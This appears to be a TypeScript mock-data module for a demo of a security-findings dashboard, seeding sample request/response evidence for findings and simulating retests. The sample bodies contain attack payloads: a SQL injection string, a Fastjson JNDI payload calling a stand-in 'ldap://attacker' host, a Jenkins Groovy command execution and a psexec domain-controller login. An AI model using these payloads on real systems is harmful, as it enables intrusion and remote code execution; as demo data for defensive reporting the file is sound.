import type {
  EvidenceBodyPreview,
  FindingTraffic,
  FindingTrafficBinding,
  TrafficEvidenceRole,
  TrafficEvidenceSnapshot,
} from "@/lib/types";

import * as D from "../data";
import { mockRetestMessages, mockRetests, mockState } from "./state";

// ── related traffic evidence (finding traffic) ─────────────────────────────────────────────
// The backend stores request/response snapshots in a separate evidence table; the frontend detail page renders them with FindingTrafficPanel.
// In the demo some findings have preset bindings whose snapshots reference mock captures (data.traffic.exchanges),
// and the rest return empty bindings. Without these routes the detail page would read an empty object and crash the whole page on bindings.length.
export const mockExchangeById = new Map((D.traffic.exchanges ?? []).map((exchange) => [exchange.id, exchange]));

export interface MockBindingSeed {
  traffic_id: string;
  role: TrafficEvidenceRole;
  note?: string;
}

// Preset traffic evidence per finding (finding id → bound captures). Requests are chosen to match the finding semantics,
// so the "Related traffic" section of the demo detail page looks realistic.
export const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
  "f-1": [
    { traffic_id: "x-2", role: "proof", note: "q parameter injection payload; the response echoes the MSSQL error." },
  ],
  "f-2": [
    { traffic_id: "x-8", role: "baseline", note: "Own order id=1001, as a normal baseline." },
    { traffic_id: "x-9", role: "proof", note: "Changing id=1002 reads another user's order without authorization." },
  ],
  "f-12": [
    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload that triggers a callback." },
    { traffic_id: "x-16", role: "verification", note: "A second request confirms command execution landed." },
  ],
  "f-15": [
    { traffic_id: "x-17", role: "baseline", note: "The Jenkins Script Console is reachable without authorization." },
    { traffic_id: "x-18", role: "proof", note: "scriptText executes a Groovy command and returns SYSTEM." },
  ],
  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec logs into the domain controller DC01 as svc_deploy." }],
};

// The demo uses fixed message bodies to avoid blank Request/Response panes in the detail page.
export const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
  "x-2": {
    req: "q=1' AND 1=CONVERT(int,@@version)--",
    resp: '{"error":"Conversion failed when converting the nvarchar value \'Microsoft SQL Server 2019 ...\' to data type int."}',
  },
  "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
  "x-9": {
    req: "",
    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"Chaoyang, Beijing ****","phone":"138****6021"}',
  },
  "x-15": {
    req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
    resp: '{"status":"error","message":"internal server error"}',
  },
  "x-16": { req: '{"cmd":"id"}', resp: '{"status":"ok","out":"uid=33(www-data) gid=33(www-data)"}' },
  "x-17": { req: "", resp: "<html><title>Jenkins Script Console</title>..." },
  "x-18": { req: "script=println 'whoami'.execute().text", resp: "nt authority\\system" },
  "x-19": { req: "[psexec] acme/svc_deploy@10.10.10.10", resp: "[*] Got SYSTEM on DC01" },
};

// Runtime state: finding id → binding list (add/remove/reorder, in-memory in the demo). Initialized from the seed on first access.
export const mockFindingTraffic: Record<string, FindingTrafficBinding[]> = {};
export const mockFindingTrafficVersion: Record<string, number> = {};

export function mockBuildSnapshot(trafficId: string): TrafficEvidenceSnapshot {
  const exchange = mockExchangeById.get(trafficId);
  const capturedAt = exchange ? Math.floor(Date.parse(exchange.ts) / 1000) : 0;
  let pathAndQuery = "/";
  try {
    if (exchange) pathAndQuery = new URL(exchange.url).pathname + new URL(exchange.url).search;
  } catch {
    // Fall back to the root path.
  }
  const body = mockEvidenceBodies[trafficId];
  return {
    id: `snap-${trafficId}`,
    source_traffic_id: trafficId,
    captured_at: capturedAt,
    url: exchange?.url ?? "",
    method: exchange?.method ?? "GET",
    status: exchange?.status ?? 0,
    content_type: exchange?.content_type ?? "",
    req_head: `${exchange?.method ?? "GET"} ${pathAndQuery} HTTP/1.1\nHost: ${exchange?.host ?? ""}`,
    resp_head: `HTTP/1.1 ${exchange?.status ?? 0}\nContent-Type: ${exchange?.content_type ?? ""}`,
    req_hash: `req-${trafficId}`,
    resp_hash: `resp-${trafficId}`,
    req_len: body ? new TextEncoder().encode(body.req).length : 0,
    resp_len: exchange?.resp_len ?? (body ? new TextEncoder().encode(body.resp).length : 0),
  };
}

export function mockTrafficBindings(findingID: string): FindingTrafficBinding[] {
  if (!mockFindingTraffic[findingID]) {
    const seeds = mockFindingTrafficSeeds[findingID] ?? [];
    mockFindingTraffic[findingID] = seeds.map((seed, index) => ({
      id: String(++mockState.bindingSeq),
      finding_id: findingID,
      snapshot_id: `snap-${seed.traffic_id}`,
      role: seed.role,
      note: seed.note ?? "",
      position: index,
      created_at: new Date(Date.now() - (seeds.length - index) * 1000).toISOString(),
      snapshot: mockBuildSnapshot(seed.traffic_id),
    }));
    mockFindingTrafficVersion[findingID] = 1;
  }
  return mockFindingTraffic[findingID];
}

export function mockTrafficSummary(findingID: string): FindingTraffic {
  const bindings = mockTrafficBindings(findingID).map((binding, index) => ({
    ...binding,
    position: index,
    // List/summary endpoints strip the message heads, consistent with the backend trafficSummary.
    snapshot: { ...binding.snapshot, req_head: "", resp_head: "" },
  }));
  const version = mockFindingTrafficVersion[findingID] ?? 1;
  return { finding_id: findingID, version, report_version: version, bindings };
}

export function mockTrafficCount(findingID: string): number {
  return mockTrafficBindings(findingID).length;
}

export function mockEvidencePreview(text: string): EvidenceBodyPreview {
  return { content: text, offset: 0, total: text.length, next_offset: text.length, truncated: false, binary: false };
}

export function advanceMockRetests() {
  for (const retest of mockRetests) {
    if (retest.status !== "running" || retest.conversation_id == null) continue;
    if (Date.now() - Date.parse(retest.created_at) < 15000) continue;
    retest.status = "completed";
    retest.verdict = "inconclusive";
    retest.summary =
      "The demo environment did not run real verification, so the finding's current status cannot be confirmed.";
    retest.evidence =
      "### Demo record\n\nLinked to the original finding. This environment has no real Agent connected and sent no requests to the target; run the retest in a real deployment.";
    retest.finished_at = new Date().toISOString();
    mockRetestMessages[retest.conversation_id].push({
      seq: 3,
      worker: "retester",
      ts: retest.finished_at,
      kind: "text",
      summary: retest.summary,
      detail: retest.evidence,
    });
  }
}

export function stopMockRetest(conversationID: number) {
  for (const retest of mockRetests) {
    if (retest.conversation_id !== conversationID || !["pending", "running"].includes(retest.status)) continue;
    retest.status = "stopped";
    retest.finished_at = new Date().toISOString();
    retest.error = "Demo retest stopped";
  }
}
